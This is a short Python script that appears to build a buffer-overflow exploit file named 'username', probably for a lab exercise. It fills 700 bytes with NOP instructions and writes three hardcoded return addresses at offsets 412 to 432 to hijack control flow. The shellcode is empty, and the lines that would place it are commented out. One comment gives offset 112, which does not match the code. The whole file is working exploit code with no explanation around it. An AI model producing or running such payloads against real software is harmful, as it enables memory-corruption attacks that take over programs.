#98.70.38.200
import sys

shellcode= ( ""
).encode('latin-1')

# Fill the content with NOPs
content = bytearray(0x90 for i in range(700))
# Put the shellcode at the end
#start = 1000 - len(shellcode)
#print(start)
#content[start:] = shellcode

# Put the address at offset 112
ret = 0x5655626d
content[412:416] = (ret).to_bytes(4,byteorder='little')
ret = 0xffffbd80
content[424:428] = (ret).to_bytes(4,byteorder='little')
ret = 0xffffb9b1
content[428:432] = (ret).to_bytes(4,byteorder='little')

# Write the content to a file
with open('username', 'wb') as f:
    f.write(content)